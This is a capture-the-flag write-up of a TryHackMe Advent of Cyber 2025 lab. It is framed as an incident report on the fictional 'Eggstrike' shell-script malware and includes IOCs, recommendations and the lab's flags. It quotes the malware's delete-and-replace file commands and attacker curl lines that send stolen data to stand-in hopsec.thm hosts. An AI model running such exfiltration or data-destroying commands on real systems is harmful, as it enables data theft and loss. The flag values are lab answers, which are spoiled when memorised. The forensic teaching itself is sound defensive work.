# Linux CLI - Shells Bells | Executive Summary

**Challenge**: TryHackMe Advent of Cyber 2025 - Day 1
**Date**: 2025-12-25
**Difficulty**: Easy
**Completion**: 100% (9/9 questions answered)
**Author**: Salim Hadda

---

## Executive Summary

This report documents the investigation of a security breach at The Best Festival Company (TBFC) involving the "Eggstrike" malware deployed by Sir Carrotbane from HopSec Island. Using Linux command-line interface tools, the investigation revealed a sophisticated attack targeting the Christmas wishlist system, including credential attacks, file manipulation, and data exfiltration.

---

## Key Findings

### Attack Overview
- **Attacker**: Sir Carrotbane, HopSec Island Red Team Leader
- **Target**: TBFC SOC-mas Christmas ordering platform
- **Method**: Brute force login + malware deployment
- **Impact**: Christmas wishlist theft and replacement with EASTMAS propaganda

### Malware Analysis
**Name**: Eggstrike v0.3
**Type**: Shell script malware
**Location**: `/home/socmas/2025/eggstrike.sh`
**Functionality**:
- Extracts unique Christmas orders
- Deletes original wishlist file
- Replaces with fake EASTMAS wishlist
- Exfiltrates data to HopSec servers

---

## Technical Findings

### 1. Failed Authentication Attempts
**Evidence Location**: `/var/log/auth.log`
**Finding**: Multiple failed login attempts on `socmas` account
**Source**: `eggbox-196.hopsec.thm`
**Analysis**: Indicates brute force or credential stuffing attack

**Command Used**:
```bash
grep "Failed password" /var/log/auth.log
```

### 2. Malicious Script Discovery
**Evidence Location**: `/home/socmas/2025/eggstrike.sh`
**Finding**: Shell script performing file manipulation and data theft

**Script Actions**:
1. `cat wishlist.txt | sort | uniq > /tmp/dump.txt` - Extract unique wishes
2. `rm wishlist.txt && echo "Christmas is fading..."` - Delete original file
3. `mv eastmas.txt wishlist.txt && echo "EASTMAS is invading!"` - Replace with fake data

### 3. Data Exfiltration
**Evidence Location**: `/root/.bash_history`
**Finding**: Root account bash history shows data exfiltration commands

**Attacker Commands**:
```bash
curl --data "@/tmp/dump.txt" http://files.hopsec.thm/upload
curl --data "%qur\\(tq_` :D AH?65P" http://red.hopsec.thm/report
```

**Analysis**: Christmas wishlist data sent to HopSec infrastructure

### 4. Hidden Security Guide
**Evidence Location**: `/home/mcskidy/Guides/.guide.txt`
**Finding**: McSkidy left hidden security guide before kidnapping
**Flag**: `THM{learning-linux-cli}`

**Guide Contents**:
> "I think King Malhare from HopSec Island is preparing for an attack. Check /var/log/ and grep inside, let the logs become your guide. Look for eggs that want to hide, check their shells for what's inside!"

---

## Indicators of Compromise (IOCs)

### Network IOCs
| IOC Type | Value | Description |
|----------|-------|-------------|
| Domain | `hopsec.thm` | Attacker infrastructure |
| Domain | `eggbox-196.hopsec.thm` | Brute force source |
| Domain | `files.hopsec.thm` | Exfiltration server |
| Domain | `red.hopsec.thm` | C2 reporting server |

### File System IOCs
| IOC Type | Value | Description |
|----------|-------|-------------|
| File | `/home/socmas/2025/eggstrike.sh` | Malware script |
| File | `/tmp/dump.txt` | Stolen wishlist data |
| File | `eastmas.txt` | Propaganda replacement |

### Behavioral IOCs
- Failed login attempts from hopsec.thm domains
- Unauthorized root-level curl commands
- Suspicious file modifications in socmas directory
- Data exfiltration via HTTP POST

---

## Skills Demonstrated

### Linux CLI Proficiency
- ✅ Directory listing (`ls`, `ls -la`)
- ✅ File viewing (`cat`)
- ✅ Directory navigation (`cd`, `pwd`)
- ✅ Hidden file discovery (dotfiles)
- ✅ Log analysis (`grep`)
- ✅ File searching (`find`)
- ✅ Privilege escalation (`sudo su`)
- ✅ Bash history forensics

### Security Investigation
- ✅ Authentication log analysis
- ✅ Malware script analysis
- ✅ Data exfiltration detection
- ✅ Forensic evidence collection
- ✅ Attack chain reconstruction

### Linux Special Symbols
- ✅ Pipe operator (`|`) - Command chaining
- ✅ Output redirection (`>`, `>>`) - File writing
- ✅ Conditional execution (`&&`) - Success-dependent commands

---

## Flags Collected

| Flag | Location | Value | Status |
|------|----------|-------|--------|
| McSkidy's Guide | `/home/mcskidy/Guides/.guide.txt` | `THM{learning-linux-cli}` | ✅ Completed |
| Eggstrike Script | `/home/socmas/2025/eggstrike.sh` | `THM{sir-carrotbane-attacks}` | ✅ Completed |
| Root Bash History | `/root/.bash_history` | `THM{until-we-meet-again}` | ✅ Completed |

---

## Recommendations

### Immediate Actions (Critical - 24 hours)
1. **Isolate Compromised System**: Disconnect socmas server from network
2. **Reset All Credentials**: Force password reset for socmas, root, and all privileged accounts
3. **Restore from Backup**: Recover clean wishlist.txt from last known good backup
4. **Block HopSec Infrastructure**: Add firewall rules to block all *.hopsec.thm traffic
5. **Investigate Data Loss**: Determine scope of wishlist data exfiltration

### Short-term Actions (1 week)
1. **Forensic Analysis**: Full disk image and memory capture for detailed investigation
2. **Malware Removal**: Remove eggstrike.sh and associated files
3. **Log Review**: Analyze all system logs for additional compromise indicators
4. **Security Audit**: Review all user accounts and their permissions
5. **Incident Report**: Document attack timeline and impact assessment

### Long-term Improvements (1 month)
1. **Multi-Factor Authentication**: Implement MFA on all critical systems
2. **Security Monitoring**: Deploy SIEM for real-time log analysis
3. **File Integrity Monitoring**: Implement FIM solution (OSSEC, Tripwire)
4. **Regular Security Audits**: Schedule quarterly penetration tests
5. **Security Training**: Train staff on Linux security best practices
6. **Backup Strategy**: Verify and test backup/recovery procedures

---

## Attack Timeline

```
[Unknown Date/Time]
├─ McSkidy discovers Eggsploit activity
├─ McSkidy creates hidden security guide
└─ McSkidy is kidnapped

[Attack Initiation]
├─ Brute force attacks on socmas account
└─ Source: eggbox-196.hopsec.thm

[Compromise]
├─ Successful authentication achieved
├─ Root access obtained
└─ Eggstrike malware deployed

[Malware Execution]
├─ Wishlist data extracted to /tmp/dump.txt
├─ Original wishlist.txt deleted
└─ Replaced with eastmas.txt

[Data Exfiltration]
├─ Wishlist uploaded to files.hopsec.thm
├─ Report sent to red.hopsec.thm
└─ Final message left: "THM{until-we-meet-again}"

[Investigation]
└─ Security team discovers compromise via CLI investigation
```

---

## Conclusion

The HopSec Island attack on TBFC's Christmas wishlist system demonstrates sophisticated adversary tactics including:
- **Persistence**: Brute force authentication until success
- **Stealth**: Hidden file manipulation and data theft
- **Exfiltration**: Organized data theft to external servers
- **Psychological Warfare**: Replacement of Christmas with EASTMAS propaganda

The investigation successfully identified:
- ✅ Attack source (HopSec Island)
- ✅ Attack method (Eggstrike malware)
- ✅ Data exfiltration channels
- ✅ Extent of system compromise

**Status**: Investigation completed (100% complete)
**Next Steps**: Full system remediation and implementation of security recommendations

---

**Classification**: Internal Investigation Report
**Distribution**: TBFC Security Team, Management
**Prepared By**: Salim Hadda
**Date**: 2025-12-25
**Platform**: TryHackMe Advent of Cyber 2025

---

*"Every command in bash history tells a story. In this case, the story of Sir Carrotbane's assault on Christmas."*
